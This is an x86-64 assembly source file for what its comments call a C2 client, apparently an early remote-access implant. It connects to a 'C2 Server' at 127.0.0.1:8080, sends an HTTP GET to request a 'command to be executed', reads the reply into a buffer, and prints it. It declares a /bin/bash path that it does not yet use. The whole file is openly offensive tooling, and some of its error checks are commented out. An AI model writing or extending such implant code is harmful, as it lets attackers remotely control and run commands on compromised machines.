section .data
    server_ip db "127.0.0.1", 0x0           ; IP of C2 Server
    server_port dw 8080                     ; 8080 for alternate HTTP
    bash_path db "/bin/bash", 0x0           ; Path to shell
    socket_fd dq 0x0
    err_msg db "Program exits due to errors", 0x0
    err_msg_len dq 0x1c
    http_GET_msg db "GET / HTTP/1.1", 0x0D ,0x0A, 0x0           ; GET message
    http_GET_msg_len db 0x10                ; Self-explanatory, really

section .bss
    rx_buffer resb 0x100                    ; Receiving buffer from the server, 256B max
    tx_buffer resb 0x400                    ; Transmitting buffer to the server, 1KB max

section .text
    global _start
    global fn_connect_client
    global fn_error_exit
    global fn_read_socket
    global fn_write_socket
    global fn_dbg_print_rx_buffer
    global fn_get_command
    global fn_poll_socket

; Function to exit
fn_error_exit:
    ; Print error message
    mov rax, 1  
    mov rdi, 1
    lea rsi, [err_msg]
    movzx rdx, byte [err_msg_len]
    syscall

    mov rax, 0x3c               ; exit syscall
    mov rdi, 0x1                ; Error code
    syscall

; Debug function to print the rx_buffer
fn_dbg_print_rx_buffer:
    push rbp
    mov rbp, rsp
    sub rsp, 0x8                ; Stackframe

    ; Write buffer to STDOUT
    mov rax, 0x1                ; read syscall
    mov rdi, 0x1                ; socket file descriptor
    lea rsi, [rx_buffer]        ; pointer to the buffer
    mov rdx, 0x100              ; buffer size
    syscall

    cmp rax, 0                 
    jl fn_error_exit            ; exit if an error occurred

    mov rsp, rbp
    pop rbp
    ret

; Function to poll the socket for reading
; Return values:
;   rax - number of bytes to be read
fn_poll_socket:
    push rbp
    mov rbp, rsp
    sub rsp, 0x18               ; Stackframe

    ; Poll data from fd
    ; Prepare fds argument
    ;
    ;   struct pollfd {
    ;       int   fd;         /* file descriptor */
    ;       short events;     /* requested events */
    ;       short revents;    /* returned events */
    ;   };

    mov rax, qword [socket_fd]
    mov dword [rsp], eax        ; pollfd.fd = socket_fd
    mov word [rsp+4], 0x1       ; pollfd.events = POLLIN (0x1)
    mov word [rsp+6], 0x0       ; pollfd.revents = 0 (clear field)

    mov rax, 0x7                ; poll syscall
    lea rdi, [rsp]              ; Pointer to pollfd struct
    mov rsi, 0x1                ; nfds = 1
    mov rdx, 0x7d0              ; timeout = 2000ms
    syscall

    ; Check syscall result
    cmp rax, 0                  ; No descriptors are ready
    ;jg .exit                    ; Return if timeout or error

    movzx rax, word [rsp+6]     ; Load revents
    test ax, 0x1                ; Check if POLLIN is set
    ;jz .exit                    ; Return if not ready

    ; Use ioctl to get number of bytes available
    mov rax, 0x10               ; ioctl syscall
    mov rdi, qword [socket_fd]  ; socket file descriptor
    mov rsi, 0x541B             ; FIONREAD command
    lea rdx, [rsp+8]            ; Pointer to result buffer
    syscall

    mov rax, qword [rsp+8]      ; Return number of bytes read

    mov rsp, rbp
    pop rbp
    ret
;.exit
;    call fn_error_exit

; Function to read the raw data of the C2 server
; Reads from the socket file descriptor stored in memory and stores inside rx_buffer
; Parameters:
; rax - number of bytes to read
; Return values:
; [rx_buffer] - buffer that has been received
fn_read_socket:
    push rbp
    mov rbp, rsp
    sub rsp, 0x8                ; Stackframe

    mov rdx, rax                ; Copy number of bytes to be read 

    ; Reads data from fd
    mov rax, 0x0                ; read syscall
    mov rdi, qword [socket_fd]  ; socket file descriptor
    lea rsi, [rx_buffer]        ; pointer to the buffer
    ; buffer size already in rdx
    syscall

    mov rsp, rbp
    pop rbp
    ret

; Function to write data on the socket to the C2 server
; Writes to the socket file descriptor stored in memory in tx_buffer
; Parameters: 
; rsi - address of the string to be written
; rdx - length of the buffer              
fn_write_socket:
    push rbp
    mov rbp, rsp
    sub rsp, 0x8                ; Stackframe

    ; Write data to fd
    mov rax, 0x1                ; write syscall
    mov rdi, qword [socket_fd]  ; socket file descriptor
    ; pointer to the buffer is in rsi parameter
    ; buffer size is in rdx parameter
    syscall

    cmp rax, 0x0                ; error treating
    jl fn_error_exit

    mov rsp, rbp
    pop rbp
    ret

; Function to connect to C2 server
; Stores the file descriptor of the socket inside the memory
fn_connect_client:
    push rbp
    mov rbp, rsp
    sub rsp, 0x18               ; Stackframe

    ; Create a socket
    mov rax, 0x29               ; socket syscall
    mov rdi, 0x2                ; domain AF_INET (2)
    mov rsi, 0x1                ; type SOCK_STREAM (1)
    mov rdx, 0x0                ; protocol default (0)
    syscall

    mov [socket_fd], al         ; save socket fd

    ; Setup sockaddr_in structure
    ; 16 bytes
    ; struct sockaddr_in {
    ;   unsigned short sin_family; (2 bytes) AF_INET
    ;   unsigned short sin_port; (2 bytes) htons(8080)
    ;   struct in_addr sin_addr; (4 bytes) 127.0.0.1
    ;   char sin_zero[8]; (8 bytes) padding
    ; }
    mov word [rsp], 0x2             ; sin_family = AF_INET
    mov word [rsp+2], 0x901f        ; sin_port = htons(8080)
    mov dword [rsp+4], 0x0100007f   ; sin_addr = 127.0.0.1
    mov qword [rsp+8], 0x0          ; sin_zero[8] remains zeroed by default
    
    ; Connect to socket
    mov rax, 0x2a               ; connect syscall
    mov rdi, [socket_fd]        ; load socket file descriptor
    lea rsi, [rsp]              ; address to stack parameter
    mov rdx, 16                 ; size of sockaddr_in
    syscall

    cmp rax, 0x0                ; error
    jl fn_error_exit

    mov rsp, rbp
    pop rbp
    ret

; Function to get a command from the server
; This will invoke a write command to the server to query for data
; Return values:
;   [rx_buffer] - parsed command to be executed
fn_get_command:
    push rbp
    mov rbp, rsp
    sub rsp, 0x8                ; Stackframe

    ; Write generic GET to server
    lea rsi, [http_GET_msg]             ; Load address into rsi
    movzx rdx, byte [http_GET_msg_len]  ; Load buffer length into rdx
    call fn_write_socket

    ; Poll server for data
    call fn_poll_socket

    ; Read command from server
    call fn_read_socket

    mov rsp, rbp
    pop rbp
    ret

_start:
    mov rbp, rsp

    ; Connection to C2 server
    call fn_connect_client

    ; Get command from server
    call fn_get_command

    call fn_dbg_print_rx_buffer

    ; Exit the program
    mov rax, 0x3c               ; exit syscall
    mov rdi, 0x0
    syscall
